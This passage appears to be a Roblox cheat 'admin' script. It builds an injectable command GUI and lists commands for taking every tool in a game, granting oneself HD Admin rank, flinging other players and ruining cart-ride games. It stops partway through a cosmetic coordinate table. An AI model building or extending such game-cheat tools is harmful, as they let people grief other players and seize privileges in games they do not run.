
local LPLR =  game:GetService('Players').LocalPlayer
local CMDS = {}
local SEIZURE = false
--Frame gui thing.
local FEAdmin = Instance.new("ScreenGui")
local Cmdbar = Instance.new("Frame")
local Bar = Instance.new("TextBox")
local CommandEffect = Instance.new("TextLabel")
local ListTemplate = Instance.new("Frame")
local Exit = Instance.new("TextButton")
local Name = Instance.new("TextLabel")
local BodyFrame = Instance.new("Frame")
local Data = Instance.new("ScrollingFrame")
local ScrollingFrame = Instance.new("ScrollingFrame")
local UIListLayout = Instance.new("UIListLayout")
local TemplateLabel = Instance.new("TextLabel")
local TemplateLabel_2 = Instance.new("TextLabel")
local TemplateLabel_3 = Instance.new("TextLabel")
local TemplateLabel_4 = Instance.new("TextLabel")
local TemplateLabel_5 = Instance.new("TextLabel")
local TemplateLabel_6 = Instance.new("TextLabel")
local TemplateLabel_7 = Instance.new("TextLabel")
local TemplateLabel_8 = Instance.new("TextLabel")
local TemplateLabel_9 = Instance.new("TextLabel")
local TemplateLabel_10 = Instance.new("TextLabel")
local TemplateLabel_11 = Instance.new("TextLabel")
local TemplateLabel_12 = Instance.new("TextLabel")
local TemplateLabel_13 = Instance.new("TextLabel")
local TemplateLabel_14 = Instance.new("TextLabel")
local TemplateLabel_15 = Instance.new("TextLabel")
local TemplateLabel_16 = Instance.new("TextLabel")
local TemplateLabel_17 = Instance.new("TextLabel")
local TemplateLabel_18 = Instance.new("TextLabel")
local TemplateLabel_19 = Instance.new("TextLabel")
local PlayerInfoB = Instance.new("ImageButton")
local TextButton = Instance.new("TextButton")
local UICorner = Instance.new("UICorner")
local TextButton_2 = Instance.new("TextButton")

--Properties:

FEAdmin.Name = "FEAdmin"
FEAdmin.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
FEAdmin.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
FEAdmin.DisplayOrder = 999
FEAdmin.ResetOnSpawn = false

Cmdbar.Name = "Cmdbar"
Cmdbar.Parent = FEAdmin
Cmdbar.Active = true
Cmdbar.BackgroundColor3 = Color3.fromRGB(68, 68, 68)
Cmdbar.BackgroundTransparency = 1.000
Cmdbar.BorderColor3 = Color3.fromRGB(27, 42, 53)
Cmdbar.BorderSizePixel = 0
Cmdbar.Position = UDim2.new(-0.000399515033, 0, 0.0713877082, 0)
Cmdbar.Size = UDim2.new(0, 731, 0, 31)

Bar.Name = "Bar"
Bar.Parent = Cmdbar
Bar.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
Bar.BackgroundTransparency = 0.310
Bar.BorderSizePixel = 0
Bar.Position = UDim2.new(0.0229999833, 0, -1.84686923, 0)
Bar.Size = UDim2.new(200.153, 0, 1.84686661, 0)
Bar.Visible = false
Bar.Font = Enum.Font.SourceSansLight
Bar.PlaceholderColor3 = Color3.fromRGB(35, 35, 35)
Bar.Text = ""
Bar.TextColor3 = Color3.fromRGB(255, 255, 255)
Bar.TextScaled = true
Bar.TextSize = 14.000
Bar.TextWrapped = true
Bar.TextXAlignment = Enum.TextXAlignment.Left

CommandEffect.Name = "CommandEffect"
CommandEffect.Parent = Bar
CommandEffect.Active = true
CommandEffect.BackgroundColor3 = Color3.fromRGB(74, 74, 74)
CommandEffect.BackgroundTransparency = 0.310
CommandEffect.BorderSizePixel = 0
CommandEffect.Position = UDim2.new(-0.025754232, 0, 0, 0)
CommandEffect.Size = UDim2.new(0.025754232, 0, 1, 0)
CommandEffect.Font = Enum.Font.SourceSansSemibold
CommandEffect.Text = ":"
CommandEffect.TextColor3 = Color3.fromRGB(255, 255, 255)
CommandEffect.TextScaled = true
CommandEffect.TextSize = 14.000
CommandEffect.TextStrokeTransparency = 0.800
CommandEffect.TextWrapped = true
CommandEffect.TextXAlignment = Enum.TextXAlignment.Right

ListTemplate.Name = "ListTemplate"
ListTemplate.Parent = FEAdmin
ListTemplate.BackgroundColor3 = Color3.fromRGB(31, 31, 31)
ListTemplate.BackgroundTransparency = 0.400
ListTemplate.BorderSizePixel = 0
ListTemplate.Position = UDim2.new(0.496451378, -343, 0.290523708, -171)
ListTemplate.Selectable = true
ListTemplate.Size = UDim2.new(0, 696, 0, 26)

Exit.Name = "Exit"
Exit.Parent = ListTemplate
Exit.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Exit.BackgroundTransparency = 1.000
Exit.Position = UDim2.new(0.943965495, 0, 0.0384615399, 0)
Exit.Size = UDim2.new(0, 34, 0, 25)
Exit.Font = Enum.Font.SourceSansLight
Exit.Text = "X"
Exit.TextColor3 = Color3.fromRGB(236, 236, 236)
Exit.TextScaled = true
Exit.TextSize = 14.000
Exit.TextWrapped = true

Name.Name = "Name"
Name.Parent = ListTemplate
Name.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Name.BackgroundTransparency = 1.000
Name.Position = UDim2.new(0.293103456, 0, 0, 0)
Name.Size = UDim2.new(0.413793117, 0, 1, 0)
Name.Font = Enum.Font.SourceSansSemibold
Name.Text = "Loaf's Commands"
Name.TextColor3 = Color3.fromRGB(245, 245, 245)
Name.TextScaled = true
Name.TextSize = 14.000
Name.TextStrokeTransparency = 0.900
Name.TextWrapped = true

BodyFrame.Name = "BodyFrame"
BodyFrame.Parent = ListTemplate
BodyFrame.BackgroundColor3 = Color3.fromRGB(31, 31, 31)
BodyFrame.BackgroundTransparency = 0.400
BodyFrame.BorderSizePixel = 0
BodyFrame.Position = UDim2.new(0, 0, 1, 0)
BodyFrame.Selectable = true
BodyFrame.Size = UDim2.new(0, 696, 0, 432)

Data.Name = "Data"
Data.Parent = BodyFrame
Data.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
Data.BackgroundTransparency = 0.400
Data.BorderSizePixel = 0
Data.Position = UDim2.new(0.00574712688, 0, 0.011661808, 0)
Data.Size = UDim2.new(0.987068951, 0, 0.976676404, 0)
Data.BottomImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
Data.CanvasSize = UDim2.new(0, 0, 0, 0)
Data.ScrollBarThickness = 10
Data.TopImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"

ScrollingFrame.Parent = BodyFrame
ScrollingFrame.Active = true
ScrollingFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ScrollingFrame.BackgroundTransparency = 1.000
ScrollingFrame.Position = UDim2.new(0.00574712642, 0, 0, 0)
ScrollingFrame.Size = UDim2.new(0, 687, 0, 426)
ScrollingFrame.ScrollBarThickness = 0

UIListLayout.Parent = ScrollingFrame
UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder

TemplateLabel.Name = "TemplateLabel"
TemplateLabel.Parent = ScrollingFrame
TemplateLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TemplateLabel.BackgroundTransparency = 1.000
TemplateLabel.Selectable = true
TemplateLabel.Size = UDim2.new(1, 0, 0, 25)
TemplateLabel.Font = Enum.Font.SourceSansLight
TemplateLabel.Text = "Cmds - shows all the Commands"
TemplateLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
TemplateLabel.TextScaled = true
TemplateLabel.TextSize = 14.000
TemplateLabel.TextWrapped = true

TemplateLabel_2.Name = "TemplateLabel"
TemplateLabel_2.Parent = ScrollingFrame
TemplateLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TemplateLabel_2.BackgroundTransparency = 1.000
TemplateLabel_2.Selectable = true
TemplateLabel_2.Size = UDim2.new(1, 0, 0, 25)
TemplateLabel_2.Font = Enum.Font.SourceSansLight
TemplateLabel_2.Text = "Getalltools - gets all tools in game"
TemplateLabel_2.TextColor3 = Color3.fromRGB(255, 255, 255)
TemplateLabel_2.TextScaled = true
TemplateLabel_2.TextSize = 14.000
TemplateLabel_2.TextWrapped = true



TemplateLabel_3.Name = "TemplateLabel"
TemplateLabel_3.Parent = ScrollingFrame
TemplateLabel_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TemplateLabel_3.BackgroundTransparency = 1.000
TemplateLabel_3.Selectable = true
TemplateLabel_3.Size = UDim2.new(1, 0, 0, 25)
TemplateLabel_3.Font = Enum.Font.SourceSansLight
TemplateLabel_3.Text = "GrabknifeV4 - gives you grabknife (FE)"
TemplateLabel_3.TextColor3 = Color3.fromRGB(255, 255, 255)
TemplateLabel_3.TextScaled = true
TemplateLabel_3.TextSize = 14.000
TemplateLabel_3.TextWrapped = true

TemplateLabel_4.Name = "TemplateLabel"
TemplateLabel_4.Parent = ScrollingFrame
TemplateLabel_4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TemplateLabel_4.BackgroundTransparency = 1.000
TemplateLabel_4.Selectable = true
TemplateLabel_4.Size = UDim2.new(1, 0, 0, 25)
TemplateLabel_4.Font = Enum.Font.SourceSansLight
TemplateLabel_4.Text = "Harked - gives harked gui"
TemplateLabel_4.TextColor3 = Color3.fromRGB(255, 255, 255)
TemplateLabel_4.TextScaled = true
TemplateLabel_4.TextSize = 14.000
TemplateLabel_4.TextWrapped = true

TemplateLabel_5.Name = "TemplateLabel"
TemplateLabel_5.Parent = ScrollingFrame
TemplateLabel_5.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TemplateLabel_5.BackgroundTransparency = 1.000
TemplateLabel_5.Selectable = true
TemplateLabel_5.Size = UDim2.new(1, 0, 0, 25)
TemplateLabel_5.Font = Enum.Font.SourceSansLight
TemplateLabel_5.Text = "CartRideGui - gives a cart ride ruiner gui. (RARE)"
TemplateLabel_5.TextColor3 = Color3.fromRGB(255, 255, 255)
TemplateLabel_5.TextScaled = true
TemplateLabel_5.TextSize = 14.000
TemplateLabel_5.TextWrapped = true

TemplateLabel_6.Name = "TemplateLabel"
TemplateLabel_6.Parent = ScrollingFrame
TemplateLabel_6.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TemplateLabel_6.BackgroundTransparency = 1.000
TemplateLabel_6.Selectable = true
TemplateLabel_6.Size = UDim2.new(1, 0, 0, 25)
TemplateLabel_6.Font = Enum.Font.SourceSansLight
TemplateLabel_6.Text = "InsertHD - inserts hd admin in game."
TemplateLabel_6.TextColor3 = Color3.fromRGB(255, 255, 255)
TemplateLabel_6.TextScaled = true
TemplateLabel_6.TextSize = 14.000
TemplateLabel_6.TextWrapped = true

TemplateLabel_7.Name = "TemplateLabel"
TemplateLabel_7.Parent = ScrollingFrame
TemplateLabel_7.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TemplateLabel_7.BackgroundTransparency = 1.000
TemplateLabel_7.Selectable = true
TemplateLabel_7.Size = UDim2.new(1, 0, 0, 25)
TemplateLabel_7.Font = Enum.Font.SourceSansLight
TemplateLabel_7.Text = "RankHD - gives a rank in hd admin."
TemplateLabel_7.TextColor3 = Color3.fromRGB(255, 255, 255)
TemplateLabel_7.TextScaled = true
TemplateLabel_7.TextSize = 14.000
TemplateLabel_7.TextWrapped = true

TemplateLabel_8.Name = "TemplateLabel"
TemplateLabel_8.Parent = ScrollingFrame
TemplateLabel_8.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TemplateLabel_8.BackgroundTransparency = 1.000
TemplateLabel_8.Selectable = true
TemplateLabel_8.Size = UDim2.new(1, 0, 0, 25)
TemplateLabel_8.Font = Enum.Font.SourceSansLight
TemplateLabel_8.Text = "SSP - gives secret service panel."
TemplateLabel_8.TextColor3 = Color3.fromRGB(255, 255, 255)
TemplateLabel_8.TextScaled = true
TemplateLabel_8.TextSize = 14.000
TemplateLabel_8.TextWrapped = true

TemplateLabel_9.Name = "TemplateLabel"
TemplateLabel_9.Parent = ScrollingFrame
TemplateLabel_9.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TemplateLabel_9.BackgroundTransparency = 1.000
TemplateLabel_9.Selectable = true
TemplateLabel_9.Size = UDim2.new(1, 0, 0, 25)
TemplateLabel_9.Font = Enum.Font.SourceSansLight
TemplateLabel_9.Text = "Stigma - gives ICON at the bottom of stigma."
TemplateLabel_9.TextColor3 = Color3.fromRGB(255, 255, 255)
TemplateLabel_9.TextScaled = true
TemplateLabel_9.TextSize = 14.000
TemplateLabel_9.TextWrapped = true

TemplateLabel_10.Name = "TemplateLabel"
TemplateLabel_10.Parent = ScrollingFrame
TemplateLabel_10.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TemplateLabel_10.BackgroundTransparency = 1.000
TemplateLabel_10.Selectable = true
TemplateLabel_10.Size = UDim2.new(1, 0, 0, 25)
TemplateLabel_10.Font = Enum.Font.SourceSansLight
TemplateLabel_10.Text = "Sword - gives weapon in alot of games!"
TemplateLabel_10.TextColor3 = Color3.fromRGB(255, 255, 255)
TemplateLabel_10.TextScaled = true
TemplateLabel_10.TextSize = 14.000
TemplateLabel_10.TextWrapped = true

TemplateLabel_11.Name = "TemplateLabel"
TemplateLabel_11.Parent = ScrollingFrame
TemplateLabel_11.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TemplateLabel_11.BackgroundTransparency = 1.000
TemplateLabel_11.Selectable = true
TemplateLabel_11.Size = UDim2.new(1, 0, 0, 25)
TemplateLabel_11.Font = Enum.Font.SourceSansLight
TemplateLabel_11.Text = "CrossTool - gives a large cross tool."
TemplateLabel_11.TextColor3 = Color3.fromRGB(255, 255, 255)
TemplateLabel_11.TextScaled = true
TemplateLabel_11.TextSize = 14.000
TemplateLabel_11.TextWrapped = true

TemplateLabel_12.Name = "TemplateLabel"
TemplateLabel_12.Parent = ScrollingFrame
TemplateLabel_12.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TemplateLabel_12.BackgroundTransparency = 1.000
TemplateLabel_12.Selectable = true
TemplateLabel_12.Size = UDim2.new(1, 0, 0, 25)
TemplateLabel_12.Font = Enum.Font.SourceSansLight
TemplateLabel_12.Text = "Flinggui - gives a fling gui (UNLEAKED) (OP)"
TemplateLabel_12.TextColor3 = Color3.fromRGB(255, 255, 255)
TemplateLabel_12.TextScaled = true
TemplateLabel_12.TextSize = 14.000
TemplateLabel_12.TextWrapped = true

TemplateLabel_13.Name = "TemplateLabel"
TemplateLabel_13.Parent = ScrollingFrame
TemplateLabel_13.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TemplateLabel_13.BackgroundTransparency = 1.000
TemplateLabel_13.Selectable = true
TemplateLabel_13.Size = UDim2.new(1, 0, 0, 25)
TemplateLabel_13.Font = Enum.Font.SourceSansLight
TemplateLabel_13.Text = "R6 - makes you R6 (FE)"
TemplateLabel_13.TextColor3 = Color3.fromRGB(255, 255, 255)
TemplateLabel_13.TextScaled = true
TemplateLabel_13.TextSize = 14.000
TemplateLabel_13.TextWrapped = true

TemplateLabel_14.Name = "TemplateLabel"
TemplateLabel_14.Parent = ScrollingFrame
TemplateLabel_14.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TemplateLabel_14.BackgroundTransparency = 1.000
TemplateLabel_14.Selectable = true
TemplateLabel_14.Size = UDim2.new(1, 0, 0, 25)
TemplateLabel_14.Font = Enum.Font.SourceSansLight
TemplateLabel_14.Text = "Thomas - makes your character thomas the train. (FE)"
TemplateLabel_14.TextColor3 = Color3.fromRGB(255, 255, 255)
TemplateLabel_14.TextScaled = true
TemplateLabel_14.TextSize = 14.000
TemplateLabel_14.TextWrapped = true

TemplateLabel_15.Name = "TemplateLabel"
TemplateLabel_15.Parent = ScrollingFrame
TemplateLabel_15.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TemplateLabel_15.BackgroundTransparency = 1.000
TemplateLabel_15.Selectable = true
TemplateLabel_15.Size = UDim2.new(1, 0, 0, 25)
TemplateLabel_15.Font = Enum.Font.SourceSansLight
TemplateLabel_15.Text = "BreadGui - inserts bread gui for daycare games."
TemplateLabel_15.TextColor3 = Color3.fromRGB(255, 255, 255)
TemplateLabel_15.TextScaled = true
TemplateLabel_15.TextSize = 14.000
TemplateLabel_15.TextWrapped = true

TemplateLabel_16.Name = "TemplateLabel"
TemplateLabel_16.Parent = ScrollingFrame
TemplateLabel_16.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TemplateLabel_16.BackgroundTransparency = 1.000
TemplateLabel_16.Position = UDim2.new(0.120815136, 0, 0.0289351847, 0)
TemplateLabel_16.Selectable = true
TemplateLabel_16.Size = UDim2.new(1, 0, 0, 25)
TemplateLabel_16.Font = Enum.Font.SourceSansLight
TemplateLabel_16.Text = "LuaHammer - gives you a lua hammer."
TemplateLabel_16.TextColor3 = Color3.fromRGB(255, 255, 255)
TemplateLabel_16.TextScaled = true
TemplateLabel_16.TextSize = 14.000
TemplateLabel_16.TextWrapped = true

TemplateLabel_17.Name = "TemplateLabel"
TemplateLabel_17.Parent = ScrollingFrame
TemplateLabel_17.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TemplateLabel_17.BackgroundTransparency = 1.000
TemplateLabel_17.Selectable = true
TemplateLabel_17.Size = UDim2.new(1, 0, 0, 25)
TemplateLabel_17.Font = Enum.Font.SourceSansLight
TemplateLabel_17.Text = "Hammer - gives you a hammer tool (RARE)"
TemplateLabel_17.TextColor3 = Color3.fromRGB(255, 255, 255)
TemplateLabel_17.TextScaled = true
TemplateLabel_17.TextSize = 14.000
TemplateLabel_17.TextWrapped = true

TemplateLabel_18.Name = "TemplateLabel"
TemplateLabel_18.Parent = ScrollingFrame
TemplateLabel_18.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TemplateLabel_18.BackgroundTransparency = 1.000
TemplateLabel_18.Selectable = true
TemplateLabel_18.Size = UDim2.new(1, 0, 0, 25)
TemplateLabel_18.Font = Enum.Font.SourceSansLight
TemplateLabel_18.Text = "Gun - gives you a gun tool (RARE)"
TemplateLabel_18.TextColor3 = Color3.fromRGB(255, 255, 255)
TemplateLabel_18.TextScaled = true
TemplateLabel_18.TextSize = 14.000
TemplateLabel_18.TextWrapped = true

TemplateLabel_19.Name = "TemplateLabel"
TemplateLabel_19.Parent = ScrollingFrame
TemplateLabel_19.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TemplateLabel_19.BackgroundTransparency = 1.000
TemplateLabel_19.Selectable = true
TemplateLabel_19.Size = UDim2.new(1, 0, 0, 25)
TemplateLabel_19.Font = Enum.Font.SourceSansLight
TemplateLabel_19.Text = "Bulldozer - spawns bulldozer (VERY RARE)"
TemplateLabel_19.TextColor3 = Color3.fromRGB(255, 255, 255)
TemplateLabel_19.TextScaled = true
TemplateLabel_19.TextSize = 14.000
TemplateLabel_19.TextWrapped = true

PlayerInfoB.Name = "PlayerInfoB"
PlayerInfoB.Parent = FEAdmin
PlayerInfoB.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
PlayerInfoB.BackgroundTransparency = 1.000
PlayerInfoB.BorderSizePixel = 0
PlayerInfoB.Position = UDim2.new(0.915814102, 0, 0.998029053, -100)
PlayerInfoB.Size = UDim2.new(0, 86, 0, 82)
PlayerInfoB.Image = "rbxassetid://1553823541"

TextButton.Parent = PlayerInfoB
TextButton.BackgroundColor3 = Color3.fromRGB(12, 12, 12)
TextButton.BackgroundTransparency = 0.170
TextButton.BorderColor3 = Color3.fromRGB(35, 35, 35)
TextButton.BorderSizePixel = 9
TextButton.Position = UDim2.new(-4.30071592, 0, 0.0976852775, 0)
TextButton.Size = UDim2.new(0, 369, 0, 64)
TextButton.Font = Enum.Font.SourceSans
TextButton.Text = "Welcome to Loaf's Admin Use the Program to execute scripts Status Enabled! press : to inject Scripts!"
TextButton.TextColor3 = Color3.fromRGB(255, 231, 143)
TextButton.TextScaled = true
TextButton.TextSize = 14.000
TextButton.TextStrokeColor3 = Color3.fromRGB(26, 26, 26)
TextButton.TextWrapped = true

UICorner.Parent = TextButton

TextButton_2.Parent = PlayerInfoB
TextButton_2.BackgroundColor3 = Color3.fromRGB(12, 12, 12)
TextButton_2.BackgroundTransparency = 0.250
TextButton_2.BorderColor3 = Color3.fromRGB(35, 35, 35)
TextButton_2.BorderSizePixel = 9
TextButton_2.Position = UDim2.new(-4.30071592, 0, 0.0976852775, 0)
TextButton_2.Size = UDim2.new(0, 369, 0, 64)
TextButton_2.Font = Enum.Font.SourceSans
TextButton_2.Text = "Welcome to Loaf's Admin Use the Program to execute scripts Status Enabled! press : to inject Scripts!"
TextButton_2.TextColor3 = Color3.fromRGB(255, 231, 143)
TextButton_2.TextScaled = true
TextButton_2.TextSize = 14.000
TextButton_2.TextStrokeColor3 = Color3.fromRGB(26, 26, 26)
TextButton_2.TextWrapped = true

-- Scripts:

-- Scripts:
local function YBMK_fake_script() -- Exit.Script 
	local script = Instance.new('Script', Exit)

	script.Parent.MouseButton1Click:Connect(function()
		ListTemplate.Visible = false
	end)
end
coroutine.wrap(YBMK_fake_script)()

local function LAHHOE_fake_script() -- Data.Dragify 
	local script = Instance.new('LocalScript', Data)

end
coroutine.wrap(LAHHOE_fake_script)()
function AddCmd(name,desc,func)

CMDS[name]=func
end
function Service(thing)
return game:GetService(thing)
end
--same cmd
AddCmd('cmds','',function()
ListTemplate.Visible = true
end)
AddCmd('Cmds','',function()
ListTemplate.Visible = true
end)
AddCmd('Thomas','',function()
local Handles = {
CFrame.new(1.9499995708465576, -0.4999998211860657, 1.0500001907348633),
CFrame.new(1.2999999523162842, 0.900000274181366, -6.5),
CFrame.new(2.299999952316284, -1.5999996662139893, -5.5),
CFrame.new(0.30000001192092896, 0.900000274181366, -6.5),
CFrame.new(0.800000011920929, -2.5999996662139893, -3),
CFrame.new(1.2999999523162842, -0.599999725818634, -2.5),
CFrame.new(1.7999999523162842, -0.599999725818634, -5.5),
CFrame.new(2.299999952316284, -0.599999725818634, 0),
CFrame.new(2.799999713897705, 1.9000003337860107, -2),
CFrame.new(0.800000011920929, 2.4000003337860107, -4.5),
CFrame.new(1.2999999523162842, -0.09999972581863403, -5.5),
CFrame.new(1.2999999523162842, 0.900000274181366, -4),
CFrame.new(2.3000001907348633, -3.0999996662139893, -6),
CFrame.new(2.299999713897705, 1.9000003337860107, -5),
CFrame.new(3.299999952316284, -0.09999972581863403, -4),
CFrame.new(0.30000001192092896, 1.9000003337860107, -5),
CFrame.new(2.299999713897705, 2.4000003337860107, 0.5),
CFrame.new(3.299999713897705, 1.900000810623169, 0),
CFrame.new(2.799999713897705, 1.9000003337860107, -1),
CFrame.new(1.3000001907348633, -3.0999996662139893, -4.5),
CFrame.new(1.2999999523162842, 1.9000003337860107, -6),
CFrame.new(0.7499998211860657, -0.6999996304512024, 1.0500001907348633),
CFrame.new(3.799999952316284, 2.000000238418579, 0.19999980926513672),
CFrame.new(1.2999999523162842, -0.599999725818634, -3.5),
CFrame.new(3.299999713897705, 1.900000810623169, -3.5),
CFrame.new(-0.20000000298023224, -1.5999999046325684, -2.5),
CFrame.new(-0.20000000298023224, -0.09999972581863403, -0.5),
CFrame.new(0.800000011920929, -2.5999996662139893, -1.5),
CFrame.new(-0.20000000298023224, -1.5999999046325684, -6.5),
CFrame.new(1.3000001907348633, -3.8999998569488525, 0.5),
CFrame.new(1.2999999523162842, 0.900000274181366, -3.5),
CFrame.new(1.2999999523162842, 1.9000003337860107, 0.5),
CFrame.new(0.800000011920929, 1.9000003337860107, -2.5),
CFrame.new(2.799999713897705, 1.9000003337860107, -0.5),
CFrame.new(1.799999713897705, 0.900000274181366, -2),
CFrame.new(-0.20000000298023224, -1.5999999046325684, -6.5),
CFrame.new(2.299999952316284, -0.09999972581863403, -5),
CFrame.new(1.3000001907348633, -2.5999996662139893, -7),
CFrame.new(0.800000011920929, 1.9000003337860107, -5),
CFrame.new(1.2999999523162842, -0.09999972581863403, -7),
CFrame.new(2.299999952316284, -0.09999972581863403, -6.5),
CFrame.new(1.7999999523162842, -0.09999972581863403, -4),
CFrame.new(3.299999952316284, -1.0999994277954102, -2),
CFrame.new(1.8000001907348633, -3.0999996662139893, -5.5),
CFrame.new(-0.20000000298023224, 2.3999998569488525, -7),
CFrame.new(-0.699999988079071, 1.8999998569488525, -4.5),
CFrame.new(2.299999713897705, 0.900000274181366, -1.5),
CFrame.new(0.800000011920929, 0.900000274181366, -4),
CFrame.new(0.30000001192092896, -2.5999996662139893, -5),
CFrame.new(1.3000001907348633, -3.0999996662139893, -0.5),
CFrame.new(3.299999952316284, -1.0999994277954102, -2.5),
CFrame.new(2.299999952316284, -2.0999996662139893, -1.5),
CFrame.new(0.800000011920929, -2.5999996662139893, -3.5),
CFrame.new(1.8000001907348633, -3.0999996662139893, -5),
CFrame.new(2.799999952316284, -0.09999972581863403, -1.5),
CFrame.new(3.299999713897705, 1.900000810623169, -0.5),
CFrame.new(1.2999999523162842, -0.599999725818634, -1.5),
CFrame.new(0.30000001192092896, -1.5999996662139893, 0.5),
CFrame.new(-0.20000000298023224, -0.09999972581863403, -3.5),
CFrame.new(3.799999952316284, 2.6000006198883057, 1),
CFrame.new(1.7999999523162842, -1.5999996662139893, -6.5),
CFrame.new(2.799999713897705, 1.9000003337860107, -5.5),
CFrame.new(2.299999952316284, -2.0999996662139893, -2.5),
CFrame.new(2.799999952316284, -0.09999972581863403, -1),
CFrame.new(3.299999952316284, -1.0999994277954102, -6),
CFrame.new(3.799999952316284, 2.200000524520874, 1),
CFrame.new(1.799999713897705, 0.900000274181366, -4),
CFrame.new(3.299999952316284, -1.5999994277954102, -7),
CFrame.new(1.7999999523162842, -0.09999972581863403, -2.5),
CFrame.new(-0.699999988079071, 2.200000047683716, 1),
CFrame.new(0.30000001192092896, -0.09999972581863403, -0.5),
CFrame.new(3.799999952316284, 2.000000238418579, -7.300000190734863),
CFrame.new(-0.20000000298023224, -0.599999725818634, -5),
CFrame.new(0.800000011920929, -1.5999996662139893, -6),
CFrame.new(1.799999713897705, 1.9000003337860107, -2.5),
CFrame.new(0.800000011920929, -0.09999972581863403, -2),
CFrame.new(3.799999952316284, 2.4000003337860107, -3.6999998092651367),
CFrame.new(2.799999952316284, -0.09999972581863403, 0),
CFrame.new(3.299999952316284, -0.599999725818634, -2),
CFrame.new(2.799999952316284, -0.599999725818634, -0.5),
CFrame.new(3.299999952316284, -0.599999725818634, -4.5),
CFrame.new(1.9500000476837158, -0.8999999165534973, 1.0500001907348633),
CFrame.new(0.30000001192092896, 0.900000274181366, -4),
CFrame.new(2.799999952316284, -0.09999972581863403, -6),
CFrame.new(-0.20000000298023224, -0.09999972581863403, -2),
CFrame.new(0.800000011920929, -0.599999725818634, -6),
CFrame.new(2.799999952316284, 0.900000274181366, -0.5),
CFrame.new(-0.699999988079071, 2.3999998569488525, 1.3000001907348633),
CFrame.new(1.7999999523162842, -0.599999725818634, -4),
CFrame.new(2.299999952316284, -0.599999725818634, -2.5),
CFrame.new(1.7999999523162842, -2.5999996662139893, -7),
CFrame.new(2.799999952316284, -0.09999972581863403, -6.5),
CFrame.new(3.299999952316284, -0.09999972581863403, -3),
CFrame.new(1.3000001907348633, -3.0999996662139893, 0),
CFrame.new(2.299999713897705, 1.9000003337860107, -1),
CFrame.new(1.7999999523162842, -2.5999996662139893, -2),
CFrame.new(-0.20000000298023224, 2.3999998569488525, 0.5),
CFrame.new(-0.20000000298023224, -3.1000001430511475, -5.5),
CFrame.new(3.799999952316284, 2.200000524520874, -1.5),
CFrame.new(1.7999999523162842, -0.09999972581863403, -3.5),
CFrame.new(-0.699999988079071, 2.3999998569488525, -6.199999809265137),
CFrame.new(2.299999952316284, -1.5999996662139893, -7),
CFrame.new(0.800000011920929, 1.9000003337860107, -4),
CFrame.new(2.799999952316284, -1.5999996662139893, -3),
CFrame.new(1.2999999523162842, -1.5999996662139893, -5.5),
CFrame.new(2.299999952316284, -0.599999725818634, -7),
CFrame.new(1.2999999523162842, -0.599999725818634, -6),
CFrame.new(1.799999713897705, 1.9000003337860107, -2),
CFrame.new(1.8500001430511475, -1.0999996662139893, 1.0500001907348633),
CFrame.new(2.3000001907348633, -3.0999996662139893, -7),
CFrame.new(0.30000001192092896, -2.0999996662139893, 0.5),
CFrame.new(2.799999713897705, 2.4000003337860107, -4.5),
CFrame.new(2.799999952316284, -1.5999996662139893, -6),
CFrame.new(2.799999952316284, 0.900000274181366, -6),
CFrame.new(1.2999999523162842, 1.9000003337860107, -4),
CFrame.new(0.30000001192092896, -0.09999972581863403, -5),
CFrame.new(2.799999952316284, -0.599999725818634, -4),
CFrame.new(1.2999999523162842, -0.599999725818634, -7),
CFrame.new(3.299999713897705, 1.900000810623169, -2),
CFrame.new(2.299999952316284, -2.0999996662139893, -4.5),
CFrame.new(2.299999952316284, -0.599999725818634, -4),
CFrame.new(2.799999713897705, 1.9000003337860107, 1.1999998092651367),
CFrame.new(3.299999713897705, 1.900000810623169, -2.5),
CFrame.new(3.799999952316284, 2.000000238418579, -1.6000003814697266),
CFrame.new(2.299999952316284, -2.0999996662139893, -4),
CFrame.new(2.799999713897705, 1.9000003337860107, -3),
CFrame.new(1.7999999523162842, -0.599999725818634, -1.5),
CFrame.new(2.299999952316284, -1.5999996662139893, -5),
CFrame.new(2.299999952316284, -1.5999996662139893, 0.5),
CFrame.new(-0.699999988079071, 2.799999952316284, -2.3000001907348633),
CFrame.new(0.30000001192092896, -0.599999725818634, -1),
CFrame.new(2.799999952316284, 0.900000274181366, -7),
CFrame.new(-0.20000000298023224, 1.8999998569488525, -1),
CFrame.new(1.7999999523162842, -0.599999725818634, -1),
CFrame.new(0.800000011920929, -3.0999996662139893, -7),
CFrame.new(1.0499999523162842, -0.4999998211860657, 1.0500001907348633),
CFrame.new(1.7999999523162842, -0.599999725818634, -5),
CFrame.new(-0.699999988079071, 2.200000047683716, -2.40000057220459),
CFrame.new(2.799999952316284, -1.5999996662139893, -5),
CFrame.new(3.299999952316284, -0.599999725818634, -1),
CFrame.new(2.8000001907348633, -3.0999996662139893, -5.5),
CFrame.new(2.299999713897705, 0.900000274181366, -5.5),
CFrame.new(1.7999999523162842, -2.5999996662139893, 0),
CFrame.new(2.799999952316284, -0.09999972581863403, -3),
